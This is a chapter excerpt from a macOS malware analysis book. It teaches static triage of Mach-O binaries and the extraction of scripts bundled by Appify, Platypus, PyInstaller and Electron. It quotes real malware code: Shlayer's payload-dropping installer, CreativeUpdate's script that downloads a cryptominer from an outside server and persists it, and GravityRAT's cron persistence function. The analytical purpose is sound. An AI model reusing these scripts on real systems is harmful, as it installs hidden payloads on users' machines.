<p class="BodyFirst">Though the Mach-O file format isn’t directly readable by mere mortals, you might still find nonbinary data within it, such as strings or sequences of printable characters. Using the aptly named <code>strings</code><b> </b>utility, you can easily extract such embedded strings from a compiled Mach-O binary, whether they be method or function names, debug or error messages, or hardcoded paths and URLs. These strings can provide valuable insight into the capabilities of the binary being analyzed.</p>
<p>When extracting strings from a binary, always run <code>strings</code> with the <code>-</code> flag to instruct the utility to scan the entire file. Otherwise <code>strings</code> will scan only certain sections. Also, the <code>strings</code> utility can only scan for ASCII strings, so it might miss Unicode strings. For that reason, you might instead use a Unicode-aware utility, such as FLOSS.<sup class="endnote"><a href="#c05-endnote-9" id="c05-noteref-9">9</a></sup></p>
<p>By design, the <code>strings</code> utility is fairly simple; all it does is display sequences of printable characters. As such, it will output many random sequences of binary values that just happen to be printable, and you’ll have to sift through the results to find strings of interest. <a href="#listing5-17" id="listinganchor5-17">Listing 5-17</a> shows part of the output from <code>strings</code> when run on WindTail’s <em>usrnode</em> binary:</p>
<pre><code>% <b>strings - Final_Presentation.app/Contents/MacOS/usrnode</b><br/>...<br/><br/><span aria-label="annotation1" class="CodeAnnotationHang">1</span> GenrateDeviceName <br/>m_ComputerName_UserName<br/>m_uploadURL<br/><br/><span aria-label="annotation2" class="CodeAnnotationHang">2</span> BouCfWujdfbAUfCos/iIOg== <br/>Bk0WPpt0IFFT30CP6ci9jg==<br/>RYfzGQY52uA9SnTjDWCugw==<br/>XCrcQ4M8lnb1sJJo7zuLmQ==<br/>3J1OfDEiMfxgQVZur/neGQ==<br/>Nxv5JOV6nsvg/lfNuk3rWw==<br/>Es1qIvgb4wmPAWwlagmNYQ==<br/><br/><span aria-label="annotation3" class="CodeAnnotationHang">3</span> /usr/bin/zip <br/>/usr/bin/curl</code></pre>
<p class="CodeListingCaption"><a id="listing5-17">Listing 5-17</a>: Extracting embedded strings with <code>strings</code></p> (WindTail)
<p>In this output, we find function names and variables that, based on their names, appear to be related to survey logic <span aria-label="annotation1" class="CodeAnnotation">1</span>. Following this are base64-encoded strings, likely obfuscated to hide some sensitive content <span aria-label="annotation2" class="CodeAnnotation">2</span>. Finally, we find paths to various macOS utilities (used to compress and upload or download files) <span aria-label="annotation3" class="CodeAnnotation">3</span>.</p>
<p>Solely based on strings embedded within the binary, it seems likely the malware is designed to survey and steal files from an infected system. In fact, if we search online for some of the more unique strings, such as the misspelled <code>GenrateDeviceName</code>, we find a detailed report on WindTail (created by the WindShift APT group) confirming its file exfiltration capabilities (<a href="#figure5-7" id="figureanchor5-7">Figure 5-7</a>).</p>
<span epub:type="pagebreak" id="Page_113" title="113"/><figure>
<img alt="Searching “GenrateDeviceName” on Google results in a link to a blog (jamf.com) that discusses WindShift malware." class="keyline" src="image_fi/501942c05/f05007.png"/>
<figcaption><p><a id="figure5-7">Figure 5-7</a>: Leveraging Google to identify malware via embedded strings (WindTail)</p></figcaption>
</figure>
<p>Before wrapping up our discussion of the <code>strings</code> utility, it is important to note that malware authors can, of course, spoof or obfuscate embedded strings (such as variable and method names) in an attempt to thwart or mislead an initial triage. Thus, any conclusions solely based on embedded strings should be validated with other analysis methods or tools, such as via a disassembler.</p>
<h3 id="h2-501942c05-0007">Objective-C Class Information</h3>
<p class="BodyFirst">The majority of Mach-O malware is written in Objective-C. Why is this a good thing for malware analysts? Simply put, programs written in Objective-C retain their class declarations when compiled into binaries. These class declarations include the name and type of the class, the class methods, and the class instance variables. This means we can extract the names the author used when writing the malware from the compiled binary. Similar to embedded printable strings, these provide valuable insight into many aspects of the malware, such as its capabilities. Moreover, we can extract this information efficiently, without having to understand any binary code!</p>
<p>Objective-C class information will show up in the output of the aforementioned <code>strings</code> command. However, the tools mentioned in this section are specifically designed to extract and reconstruct embedded Objective-C class information and provide a representation far closer to the original source code. One proven favorite is the <code>class-dump</code> utility created by Steve Nygard.<sup class="endnote"><a href="#c05-endnote-10" id="c05-noteref-10">10</a></sup> Here, for example, we use <code>class-dump</code> to extract class information from HackingTeam’s persistent Mac backdoor, Crisis (<a href="#listing5-18" id="listinganchor5-18">Listing 5-18</a>):</p>
<pre><code>% <b>class-dump RCSMac.app</b><br/>...<br/><br/>@interface __m_MCore : NSObject<br/>{<br/>    NSString *mBinaryName;<br/>  <span aria-label="annotation1" class="CodeAnnotationCode2">1</span> NSString *mSpoofedName;<br/>}<br/><br/>- (BOOL)getRootThroughSLI;<br/>- (BOOL)isCrisisHookApp:(id)arg1;<br/><span epub:type="pagebreak" id="Page_114" title="114"/>- (BOOL)makeBackdoorResident;<br/>- (void)renameBackdoorAndRelaunch;<br/>@end</code></pre>
<p class="CodeListingCaption"><a id="listing5-18">Listing 5-18</a>: Reconstructing embedded class information with <code>class-dump</code> (Crisis)</p>
<p>Without having to understand the syntax of Objective-C class declarations, we can consider instance variables and method names alone to ascertain that this binary is likely malicious and gain insight into its logic. For example, based on the method names <code>getRootThroughSLI</code> and <code>makeBackdoorResident</code>, it is likely that the malware attempts to elevate its privileges to root and persist a backdoor component (perhaps with a spoofed name <span aria-label="annotation1" class="CodeAnnotation">1</span>).</p>
<p>The output from <code>class-dump</code> can also provide valuable input for more involved analysis methods, such as disassembling or debugging the binary. For example, if we’re attempting to figure out how Crisis persists, it would seem prudent to begin our analysis with the method named <code>makeBackdoorResident</code>.</p>
<p>Another malware specimen that readily spills its secrets to <code>class-dump</code> is the Russian XAgent (<a href="#listing5-19" id="listinganchor5-19">Listing 5-19</a>):</p>
<pre><code>% <b>class-dump XAgent</b><br/><br/>@interface MainHandler : NSObject<br/>...<br/>- (void)sendKeyLog:(id)arg1;<br/>- (void)takeScreenShot;<br/>- (void)execFile;<br/>- (void)remoteShell;<br/>- (void)getProcessList;<br/>@end</code></pre>
<p class="CodeListingCaption"><a id="listing5-19">Listing 5-19</a>: Reconstructing embedded class information with <code>class-dump</code> (XAgent)</p>
<p>Based on method names alone, we can extrapolate the malware’s likely features and capabilities. Of course, you should confirm this through other analysis tools or methods.</p>
<h2 id="h1-501942c05-0003">“Nonbinary” Binaries</h2>
<p class="BodyFirst">In the next chapter we’ll dive into “hardcore” binary analysis, such as using a disassembler to read assembly code. However, there are times when you can avoid this rather time-consuming and complex approach altogether. In some instances, the binary under analysis is actually a container for what is normally nonbinary code, like a Python script. </p>
<p>The main reason authors package nonbinary malware into native macOS binaries or applications is to facilitate distribution and user-assisted infection. Imagine that a malware author has written a cross-platform backdoor in Python. To target macOS users, it makes a lot of sense to wrap the Python code into an application natively supported by the operating system. As all Mac users are familiar with applications, they may be more easily tricked into running the malicious script with a single double-click. <span epub:type="pagebreak" id="Page_115" title="115"/>On the other hand, if the author distributed the malware as a raw Python script, the average user would be confused and probably unable to run the malware, even if they wanted to.</p>
<h3 id="h2-501942c05-0008">Identifying the Tool Used to Build the Binary</h3>
<p class="BodyFirst">Some tools used to build binaries and applications from nonbinary components include:</p>
<ul>
<li><b>Appify:</b> Packages shell scripts into macOS applications by wrapping them into a bare-bones application bundle and setting the script as the application’s main executable. An example of malware that appears to have been built with Appify is Shlayer.<sup class="endnote"><a href="#c05-endnote-11" id="c05-noteref-11">11</a></sup></li>
<li><b>Platypus:</b> Packages shell scripts into macOS applications by wrapping them in an application bundle and including an app binary that runs the script. Examples of malware built with Platypus include Eleanor and CreativeUpdate.<sup class="endnote"><a href="#c05-endnote-12" id="c05-noteref-12">12</a></sup></li>
<li><b>PyInstaller:</b> Packages Python scripts into executables. An example of malware built with PyInstaller is GravityRAT.<sup class="endnote"><a href="#c05-endnote-13" id="c05-noteref-13">13</a></sup></li>
<li><b>Electron:</b> Creates applications using web technologies, including JavaScript, HTML, and CSS. Examples of malware built with Electron include certain variants of GravityRAT and ElectroRAT.<sup class="endnote"><a href="#c05-endnote-14" id="c05-noteref-14">14</a></sup></li>
</ul>
<p>Shortly we’ll look at malware samples that abused these legitimate packaging tools and frameworks and you’ll see how to extract their original nonbinary components. Once these components have been extracted, analysis often becomes rather straightforward, as the nonbinary code is human-readable.</p>
<p>First, though, you may be wondering how, given an arbitrary binary, you can determine if it was created with one of these tools, and if so, which one. After all, the extraction procedures are specific to the method used to build or package it up. Fortunately, once you know what to look for, determining this information is easy. </p>
<p>If an application was created via Appify, it will not contain an <em>Info.plist</em> file. Instead, you’ll find a script in the application’s <em>Contents/MacOS</em> directory whose name matches that of the application.</p>
<p>When scripts are packaged via Platypus, the script is placed directly into the application bundle, and you can find it in the application’s <em>Contents/Resources/</em> directory as a file named <em>script</em>. Thus, if you come across an application that contains <em>Contents/Resources/script</em>, it’s likely a “platypussed” application.</p>
<p>It’s fairly easy to identify binaries built with PyInstaller by examining embedded strings or function names. (The embedded string <code>Py_SetPythonHome</code> is a good indicator.) The next chapter covers disassembling Mach-O binaries, but it’s worth noting here that the disassembly of a binary’s <code>main</code> function can also provide a way to determine if it was built with PyInstaller. How? Simple! The main function calls into PyInstaller’s entry point, <code>pyi_main </code>(<a href="#listing5-20" id="listinganchor5-20">Listing 5-20</a>).</p>
<pre><code><span epub:type="pagebreak" id="Page_116" title="116"/>void main() {<br/>   pyi_main(rdi, rsi, rdx, rcx, r8, r9);<br/>   return;<br/>}</code></pre>
<p class="CodeListingCaption"><a id="listing5-20">Listing 5-20</a>: A binary invoking PyInstaller’s entry point </p>
<p>Applications that were built with Electron will be linked against a framework called <code>Electron Framework.framework</code>. Moreover, you can find the nonbinary components, which are generally JavaScript files, in the application’s <em>Contents/Resources/</em> directory, saved as <em>.asar</em> files. </p>
<p>It’s important to note that these tools are legitimate, and many developers use them to generate safe applications. Don’t assume a binary or application is malicious solely because it was packaged up for distribution by one of these tools.</p>
<h3 id="h2-501942c05-0009">Extracting the Nonbinary Component</h3>
<p class="BodyFirst">Let’s now look at various malware samples packaged up using these tools and see exactly how to extract their nonbinary components. </p>
<p>In early 2021, a variant of Shlayer was discovered spreading via poisoned search engine results.<sup class="endnote"><a href="#c05-endnote-15" id="c05-noteref-15">15</a></sup> As it was a simple application bundle missing an <em>Info.plist</em> file, and other than an icon file only contained a script (whose name, <em>1302</em>, matched the application’s), it was likely packaged up via Appify (<a href="#figure5-8" id="figureanchor5-8">Figure 5-8</a>). </p>
<figure>
<img alt="Within 1302’s folder in the macOS installer, the script of 1302.app is nestled underneath Contents▶MacOS." class="" src="image_fi/501942c05/f05008.png"/>
<figcaption><p><a id="figure5-8">Figure 5-8</a>: A simple script-based application, likely built via Appify (Shlayer)</p></figcaption>
</figure>
<p>As Appify directly adds the scripts, as is, to the application bundle, no special tools are required to extract the script for analysis. And since it’s a script, analysis can commence without the use of any fancy binary static analysis tools (<a href="#listing5-21" id="listinganchor5-21">Listing 5-21</a>). </p>
<pre><code>% <b>file 1302.app/Contents/MacOS/1302</b> <br/>1302.app/Contents/MacOS/1302: Bourne-Again shell script executable (binary data)<br/><br/>% <b>cat 1302.app/Contents/MacOS/1302</b> <br/>#!/bin/bash<br/><span aria-label="annotation1" class="CodeAnnotationHang">1</span> TEMP_NAME="$(mktemp -t Installer)"<br/><span aria-label="annotation2" class="CodeAnnotationHang">2</span> tail -c 58853 $0 | funzip -1uD9jgw &gt; ${TEMP_NAME}<br/><span aria-label="annotation3" class="CodeAnnotationHang">3</span> chmod +x "${TEMP_NAME}" &amp;&amp; nohup "${TEMP_NAME}" &gt; /dev/null 2&gt;&amp;1 &amp;<br/><span epub:type="pagebreak" id="Page_117" title="117"/>killall Terminal<br/>exit<br/>PK^C^D^T^@...</code></pre>
<p class="CodeListingCaption"><a id="listing5-21">Listing 5-21</a>: A malicious installer script (Shlayer)</p>
<p>After creating a temporary filename <span aria-label="annotation1" class="CodeAnnotation">1</span>, the malware unzips password-protected data found at the end of the script into this temporary file <span aria-label="annotation2" class="CodeAnnotation">2</span>. It then makes this file executable and launches it <span aria-label="annotation3" class="CodeAnnotation">3</span>. Continued analysis identified this embedded payload as the well-known Bundlore malware. Interestingly (and completely unintentionally), applications created by Appify would inadvertently trigger a logic flaw in macOS, allowing such applications to bypass various security mechanisms, such as Gatekeeper and notarization requirements!<sup class="endnote"><a href="#c05-endnote-16" id="c05-noteref-16">16</a></sup></p>
<p>In early 2018, the popular application website MacUpdate posted an alert notifying visitors that certain links on the site had been subverted to point to malware (<a href="#figure5-9" id="figureanchor5-9">Figure 5-9</a>).</p>
<figure>
<img alt="MacUpdate’s alert warning users that they had found a link to a posted Firefox update to be malicious and had removed it." class="keyline" src="image_fi/501942c05/f05009.png"/>
<figcaption><p><a id="figure5-9">Figure 5-9</a>: A security warning from MacUpdate</p></figcaption>
</figure>
<p>As the links on the site had been compromised, users were inadvertently downloading trojanized applications containing malware. The malware, named CreativeUpdate, would download and install a persistent cryptocurrency miner that malware authors had surreptitiously hosted on Adobe’s Creative Cloud servers. </p>
<p>In a tweet, security researcher Arnaud Abbati noted that it was packaged up via Platypus.<sup class="endnote"><a href="#c05-endnote-17" id="c05-noteref-17">17</a></sup> Recall that applications created by Platypus bundle up the script into <em>Contents/Resources/script</em>. If we look at a trojanized application, in this case Firefox, infected with CreativeUpdate, we find such a script (<a href="#figure5-10" id="figureanchor5-10">Figure 5-10</a>).</p>
<figure>
<img alt="Within the Firefox installer, the malicious script (labeled as a Unix executable file) is found under Contents▶Resources." class="" src="image_fi/501942c05/f05010.png"/>
<figcaption><p><a id="figure5-10">Figure 5-10</a>: A malicious installer script embedded via Platypus (CreativeUpdate)</p></figcaption>
</figure>
<p><span epub:type="pagebreak" id="Page_118" title="118"/>This script is shown in <a href="#listing5-22" id="listinganchor5-22">Listing 5-22</a>:</p>
<pre><code>open Firefox.app <span aria-label="annotation1" class="CodeAnnotationCode">1</span><br/>if [ -f ~/Library/mdworker/mdworker ]; then <br/>killall MozillaFirefox<br/>else <span aria-label="annotation2" class="CodeAnnotationCode">2</span><br/>nohup curl -o ~/Library/mdworker.zip  <br/>https://public.adobecc.com/files/1U14RSV3MVAHBMEGVS4LZ42AFNYEFF?content_disposition=attachment &amp;&amp; <br/>unzip -o ~/Library/mdworker.zip -d ~/Library &amp;&amp; mkdir -p ~/Library/LaunchAgents &amp;&amp; <br/>mv ~/Library/mdworker/MacOSupdate.plist ~/Library/LaunchAgents &amp;&amp; sleep 300 &amp;&amp; <br/>launchctl load -w ~/Library/LaunchAgents/MacOSupdate.plist &amp;&amp; rm -rf ~/Library/mdworker.zip &amp;&amp; <br/>killall MozillaFirefox &amp;<br/>fi</code></pre>
<p class="CodeListingCaption"><a id="listing5-22">Listing 5-22</a>: A malicious installer script (CreativeUpdate)</p>
<p>As the script is quite readable, we can easily understand the malicious logic. First, it launches the non-trojanized version of Firefox so that nothing appears amiss to the user <span aria-label="annotation1" class="CodeAnnotation">1</span>. If the malware is not already installed (to <em>~/Library/mdworker/mdworker</em>) the logic in the <code>else</code> clause is executed. This downloads and installs a persistent payload from Adobe’s public Creative Cloud servers (<em>public.adobecc.com</em>) <span aria-label="annotation2" class="CodeAnnotation">2</span>. The payload turns out to be a public command line cryptocurrency miner, <em>minergate-cli</em> from MinerGate, as you can see by running it with <code>-help</code> (<a href="#listing5-23" id="listinganchor5-23">Listing 5-23</a>):<sup class="endnote"><a href="#c05-endnote-18" id="c05-noteref-18">18</a></sup></p>
<pre><code>%<b> ./mdworker -help</b><br/>  Usage:<br/>  minergate-cli [-version] -user &lt;email&gt; [-proxy &lt;url&gt;] <br/>                -&lt;currency&gt; &lt;threads&gt; [&lt;gpu intensity&gt;] <br/>                [-&lt;currency&gt; &lt;threads&gt; [&lt;gpu intensity&gt;] ...] <br/>                [-o &lt;pool&gt; -u &lt;login&gt; [-t &lt;threads&gt;]<br/>                [-i &lt;gpu intensity&gt;]]</code></pre>
<p class="CodeListingCaption"><a id="listing5-23">Listing 5-23</a>: MinerGate’s command line cryptocurrency miner</p>
<p>Once we identified the malware as built with Platypus, we were able to comprehensively analyze it without having to resort to utilizing complex binary analysis methods. </p>
<p>PyInstaller is a useful tool that can package up a Python script into a native macOS binary or application. Unfortunately, malware writers sometimes abuse it, as was the case with the cross-platform malware GravityRAT. Found in a binary named Enigma, the macOS version of GravityRAT is a compiled Mach-O binary, and <code>strings</code> reveals it was likely built via PyInstaller (<a href="#listing5-24" id="listinganchor5-24">Listing 5-24</a>):</p>
<pre><code>% <b>file GravityRAT/Enigma</b><br/>GravityRAT/Enigma: Mach-O 64-bit executable x86_64<br/><br/>% <b>strings - GravityRAT/Enigma</b><br/>...<br/><span epub:type="pagebreak" id="Page_119" title="119"/>Py_SetPythonHome<br/>Error loading Python lib '%s': dlopen: %s<br/>Error detected starting Python VM.<br/>Python</code></pre>
<p class="CodeListingCaption"><a id="listing5-24">Listing 5-24</a>: Triaging a binary via <code>file</code> and <code>strings</code> (GravityRAT)</p>
<p>Moreover, the malware’s <code>main</code> function simply calls into PyInstaller’s entry point function, <code>pyi_main</code>.</p>
<p>Recognizing that the malware was packaged up with PyInstaller is important, as it means we can extract the compiled Python code and then fully decompile it. Reading Python code is, of course, far simpler than reading decompiled assembly. One easy way to extract the compiled Python code is via the open source PyInstaller Extractor tool (<a href="#listing5-25" id="listinganchor5-25">Listing 5-25</a>):<sup class="endnote"><a href="#c05-endnote-19" id="c05-noteref-19">19</a></sup></p>
<pre><code>% <b>python pyinstxtractor.py GravityRAT/Enigma </b><br/>[+] Processing Enigma<br/>[+] Pyinstaller version: 2.1+<br/>[+] Python version: 27<br/>[+] Length of package: 17113011 bytes<br/>[+] Found 458 files in CArchive<br/>[+] Beginning extraction...please standby<br/>[+] Possible entry point: pyiboot01_bootstrap.pyc<br/>[+] Possible entry point: pyi_rth_pkgres.pyc<br/>[+] Possible entry point: pyi_rth__tkinter.pyc<br/>[+] Possible entry point: Enigma.pyc<br/>[+] Found 828 files in PYZ archive<br/>[+] Successfully extracted pyinstaller archive: Enigma</code></pre>
<p class="CodeListingCaption"><a id="listing5-25">Listing 5-25</a>: Extracting the contents of a “PyInstallered” binary with <code>pyinstxtractor</code> (GravityRAT)</p>
<p>Let’s take a peek at the extracted files, which PyInstaller Extractor places in a directory named <em>Enigma_extracted</em> (<a href="#listing5-26" id="listinganchor5-26">Listing 5-26</a>):</p>
<pre><code>% <b>ls -1 Enigma_extracted/</b><br/>Contents<br/>Crypto<br/>Enigma.pyc<br/>MacOS.so<br/>...</code></pre>
<p class="CodeListingCaption"><a id="listing5-26">Listing 5-26</a>: Extracted Python files (GravityRAT) </p>
<p>Most notable is the <em>Enigma.pyc</em> file, which, based on its file extension, likely contains Python bytecode. You can verify that this is the case by running the <code>file</code> command. We can readily decompile this bytecode on a site such as <a class="LinkURL" href="https://www.decompiler.com/">https://www.decompiler.com/</a>, which returns Python code. For a full analysis of GravityRAT’s macOS variant, including the details of the extracted Python logic, see my write-up “Adventures in Anti-Gravity: Deconstructing the Mac Variant of GravityRAT<span class="Underline">.</span>”<sup class="endnote"><a href="#c05-endnote-20" id="c05-noteref-20">20</a></sup></p>
<p><span epub:type="pagebreak" id="Page_120" title="120"/>In fact, GravityRAT has another Mac variant, this time built using Electron. This choice allowed the malware authors to create a native macOS application from cross-platform JavaScript. We can ascertain that this variant is an Electron application by observing the fact that the trojanized application, <em>StrongBox.app</em>, is linked against the Electron <em>Framework.framework</em> (<a href="#listing5-27" id="listinganchor5-27">Listing 5-27</a>):</p>
<pre><code>% <b>otool -L StrongBox.app/Contents/MacOS/StrongBox</b> <br/>/System/Library/Frameworks/Cocoa.framework/Versions/A/Cocoa <br/>/System/Library/Frameworks/Foundation.framework/Versions/C/Foundation<br/>/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit <br/>...<br/>@rpath/Electron Framework.framework/Electron Framework </code></pre>
<p class="CodeListingCaption"><a id="listing5-27">Listing 5-27</a>: Viewing linked frameworks (including Electron) with <code>otool</code> (GravityRAT)</p>
<p>Moreover, if we examine the application’s <em>Contents/Resources/</em> directory, we find a file named <em>app.asar</em> (<a href="#figure5-11" id="figureanchor5-11">Figure 5-11</a>):</p>
<figure>
<img alt="Within the StrongBox installer, the file app.asar is found under Contents▶Resources." class="" src="image_fi/501942c05/f05011.png"/>
<figcaption><p><a id="figure5-11">Figure 5-11</a>: Archived source code (GravityRAT)</p></figcaption>
</figure>
<p>Often, Electron applications are packaged using Electron’s asar archive format.<sup class="endnote"><a href="#c05-endnote-21" id="c05-noteref-21">21</a></sup> Luckily, you can unpack these archives with either the <code>asar</code> node module or the <code>npx</code> utility, as described in the online tutorial “How to get source code of any electron application.”<sup class="endnote"><a href="#c05-endnote-22" id="c05-noteref-22">22</a></sup> In this example, we opt for the latter, using <code>npx</code> to unpack the file into an output directory we name <em>appUnpacked</em> (<a href="#listing5-28" id="listinganchor5-28">Listing 5-28</a>):</p>
<pre><code>% <b>npx asar extract StrongBox.app/Contents/Resources/app.asar appUnpacked</b></code></pre>
<p class="CodeListingCaption"><a id="listing5-28">Listing 5-28</a>: Unpacking source code with <code>npx</code> (GravityRAT)</p>
<p>The extracted archive contains various files, the most notable of which are the JavaScript files <em>main.js</em> and <em>signature.js</em> (<a href="#figure5-12" id="figureanchor5-12">Figure 5-12</a>).</p>
<span epub:type="pagebreak" id="Page_121" title="121"/><figure>
<img alt="The extracted app.asar file contains various folders and files, including angular.json, main.js, node_modules, package.json, README.md, signature.js, src, tsconfig.json, and tslint.json." class="keyline" src="image_fi/501942c05/f05012.png"/>
<figcaption><p><a id="figure5-12">Figure 5-12</a>: Unpacked source code files (GravityRAT)</p></figcaption>
</figure>
<p>These two JavaScript files contain the malware’s malicious logic. As JavaScript is readily readable when compared to compiled binary code, you should be able to understand the malware’s functionality and capabilities. For example, in the <em>signature.js</em> file, we uncover the malware’s persistence techniques. Specifically, a function named <code>scheduleMac</code> persists a downloaded payload as a cron job to run every two minutes by leveraging macOS’s built-in <code>crontab</code> command (<a href="#listing5-29" id="listinganchor5-29">Listing 5-29</a>) <span aria-label="annotation1" class="CodeAnnotation">1</span>.</p>
<pre><code>function scheduleMac(fname,agentTask)<br/>{<br/>  ...<br/>  var poshellMac = loclpth+"/"+fname;<br/>  execTask('chmod -R 0700 '  + "\"" +  + "\""  );<br/>   <br/>  ...<br/>  arg = agentTask;<br/>  execTask('crontab -l 2&gt;/dev/null; <br/>           echo \' */2 * * * * ' + "\"" +poshellMac + "\" " + arg + '\' <br/>         <span aria-label="annotation1" class="CodeAnnotationCode2">1</span> | crontab -', puts22); <br/>}</code></pre>
<p class="CodeListingCaption"><a id="listing5-29">Listing 5-29</a>: Persistence via a cron job (GravityRAT) </p>
<p>For a comprehensive analysis of this Electron-based GravityRAT variant, including the extraction and analysis of its JavaScript files, see my write-up “Adventures in Anti-Gravity (Part II) Deconstructing the Mac Variant of GravityRAT.”<sup class="endnote"><a href="#c05-endnote-23" id="c05-noteref-23">23</a></sup></p>
<p><span epub:type="pagebreak" id="Page_122" title="122"/>As you’ve seen, a compiled binary or application you encounter may be nothing more than a wrapper or package containing nonbinary code. Once you’ve identified the packaging tool, you may be able to recover the nonbinary code to simplify your analysis. </p>
<h2 id="h1-501942c05-0004">Up Next</h2>
<p class="BodyFirst">In this chapter, we covered the structure of the Mach-O binary format, including headers and relevant load commands. We then discussed various static analysis tools that can triage unknown Mach-O binaries and assist in their classification. These tools can often provide enough information to answer the question, “Is this binary known?” This in turn can allow us to ascertain if it has already been classified as benign or malicious, saving us valuable analysis time and efforts. </p>
<p>However, if a binary appears to be malicious but does not match any known samples, you’ll need a more comprehensive static analysis tool. This tool is the all-powerful disassembler. In the next chapter, we’ll introduce advanced reverse-engineering techniques and show how you can leverage a disassembler to fully deconstruct almost any Mach-O binary.</p>
<h2 id="h1-501942c05-0005">Endnotes</h2>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c05-noteref-1" id="c05-endnote-1">1</a></sup>	Aidan Steele, “OS X ABI Mach-O File Format Reference,” <a class="LinkURL" href="https://github.com/aidansteele/osx-abi-macho-file-format-reference/">https://github.com/aidansteele/osx-abi-macho-file-format-reference/</a>; “loader.h,” <a class="LinkURL" href="https://opensource.apple.com/source/xnu/xnu-7195.81.3/EXTERNAL_HEADERS/mach-o/loader.h.auto.html">https://opensource.apple.com/source/xnu/xnu-7195.81.3/EXTERNAL_HEADERS/mach-o/loader.h.auto.html</a>; Alex Denisov, “Parsing Mach-O Files,” <em>Low Level Bits</em>, August 20, 2015, <a class="LinkURL" href="https://lowlevelbits.org/parsing-mach-o-files/">https://lowlevelbits.org/parsing-mach-o-files/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c05-noteref-2" id="c05-endnote-2">2</a></sup>	Peter Saghelyi, “MachOView,” <em>SourceForge</em>, <a class="LinkURL" href="https://sourceforge.net/projects/machoview/">https://sourceforge.net/projects/machoview/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c05-noteref-3" id="c05-endnote-3">3</a></sup>	Gwynne Raskind, “Let’s Build a Mach-O Executable,” <em>NSBlog</em>, November 30, 2012, <a class="LinkURL" href="https://mikeash.com/pyblog/friday-qa-2012-11-30-lets-build-a-mach-o-executable.html">https://mikeash.com/pyblog/friday-qa-2012-11-30-lets-build-a-mach-o-executable.html</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c05-noteref-4" id="c05-endnote-4">4</a></sup>	Patrick Wardle, “Made in China: OSX.ZuRu,” <em>Objective-See</em>, September 14, 2021, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x66.html">https://objective-see.com/blog/blog_0x66.html</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c05-noteref-5" id="c05-endnote-5">5</a></sup>	National Software Reference Library (NSRL), <a class="LinkURL" href="https://www.nist.gov/itl/ssd/software-quality-group/national-software-reference-library-nsrl/">https://www.nist.gov/itl/ssd/software-quality-group/national-software-reference-library-nsrl/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c05-noteref-6" id="c05-endnote-6">6</a></sup>	“Can you tell whether code has been notarized?” <em>The Eclectic Light Company</em>, May 31, 2019, <a class="LinkURL" href="https://eclecticlight.co/2019/05/31/can-you-tell-whether-code-has-been-notarized/">https://eclecticlight.co/2019/05/31/can-you-tell-whether-code-has-been-notarized/</a>.  </p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c05-noteref-7" id="c05-endnote-7">7</a></sup>	Patrick Wardle, “Apple Approved Malware,” <em>Objective-See</em>, August 30, 2020, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x4E.html">https://objective-see.com/blog/blog_0x4E.html</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><span epub:type="pagebreak" id="Page_123" title="123"/>	<sup class="endnote"><a href="#c05-noteref-8" id="c05-endnote-8">8</a></sup>	Jonathan Levin, “Code Signing—Hashed Out,” <em>RSAConference</em>, 2015, <a class="LinkURL" href="http://www.newosxbook.com/articles/CodeSigning.pdf">http://www.newosxbook.com/articles/CodeSigning.pdf</a>; “Technical Note TN2206: macOS Code Signing In Depth,” <em>Apple Developer Documentation Archive</em>, <a class="LinkURL" href="https://developer.apple.com/library/archive/technotes/tn2206/_index.html">https://developer.apple.com/library/archive/technotes/tn2206/_index.html</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c05-noteref-9" id="c05-endnote-9">9</a></sup>	flare-floss, <a class="LinkURL" href="https://github.com/fireeye/flare-floss/">https://github.com/fireeye/flare-floss/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c05-noteref-10" id="c05-endnote-10">10</a></sup>	Steve Nygard, class-dump, <a class="LinkURL" href="https://github.com/nygard/class-dump/">https://github.com/nygard/class-dump/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c05-noteref-11" id="c05-endnote-11">11</a></sup>	Mathias Bynens, appify, <a class="LinkURL" href="https://gist.github.com/mathiasbynens/674099/">https://gist.github.com/mathiasbynens/674099/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c05-noteref-12" id="c05-endnote-12">12</a></sup>	Sveinbjorn Thordarson, Platypus, <a class="LinkURL" href="https://sveinbjorn.org/platypus/">https://sveinbjorn.org/platypus/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c05-noteref-13" id="c05-endnote-13">13</a></sup>	PyInstaller, <a class="LinkURL" href="https://www.pyinstaller.org/">https://www.pyinstaller.org/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c05-noteref-14" id="c05-endnote-14">14</a></sup>	Electron, <a class="LinkURL" href="https://www.electronjs.org/">https://www.electronjs.org/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c05-noteref-15" id="c05-endnote-15">15</a></sup>	Jaron Bradley, “Shlayer malware abusing Gatekeeper bypass on macOS,” <em>Jamf Blog</em>, April 26, 2021, <a class="LinkURL" href="https://www.jamf.com/blog/shlayer-malware-abusing-gatekeeper-bypass-on-macos/">https://www.jamf.com/blog/shlayer-malware-abusing-gatekeeper-bypass-on-macos/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c05-noteref-16" id="c05-endnote-16">16</a></sup>	Patrick Wardle, “All Your Macs Are Belong To Us,” <em>Objective-See</em>, April 26, 2021, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x64.html">https://objective-see.com/blog/blog_0x64.html</a>.</p></aside>
